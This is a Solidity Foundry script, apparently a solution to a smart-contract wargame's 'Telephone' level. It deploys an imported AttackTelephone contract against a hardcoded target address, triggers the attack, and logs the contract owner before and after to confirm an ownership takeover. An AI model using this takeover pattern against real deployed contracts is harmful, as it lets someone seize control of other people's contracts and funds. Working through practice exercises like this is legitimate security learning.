// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone, AttackTelephone} from "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TelephoneSolution is Script {

    Telephone public target = Telephone(0x913f6Bc2B694E7336896143a30Ee6A7D1FF73B28);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Now, Deploy the AttackTelephone contract
        AttackTelephone attack = new AttackTelephone(target);
        console.log("Attack contract deployed owner: ", address(attack));

        // Check initial owner
        console.log("Initial Owner: ", target.owner());

        // Execute the attack
        attack.attackTel();

        // Check new owner now
        console.log("New Owner: ", target.owner());

        vm.stopBroadcast();

    }
}
